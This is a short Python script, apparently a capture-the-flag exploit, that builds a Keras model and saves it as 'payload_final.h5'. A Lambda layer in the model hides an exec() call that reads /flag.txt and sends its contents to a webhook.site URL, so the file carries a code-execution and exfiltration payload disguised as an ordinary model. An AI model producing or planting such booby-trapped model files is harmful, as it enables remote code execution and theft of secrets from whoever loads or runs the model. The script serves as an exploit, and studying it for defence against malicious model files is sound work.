from tensorflow import keras

inputs = keras.Input(shape=(150,150,3))
flatten = keras.layers.Flatten()
dense1 = keras.layers.Dense(units=1)
outputs = keras.layers.Lambda(lambda x: x if exec("__import__('requests').get(f'https://webhook.site/8a80adf1-94d1-4249-9ff3-7fd05707ddde?flag={str(open(\"/flag.txt\",\"r\").read())}')") else x)

model = keras.Sequential([inputs, flatten, dense1, outputs])

model.compile(optimizer="adam", loss="mean_squared_error", metrics=('accuracy',))

model.summary()

model.save("payload_final.h5")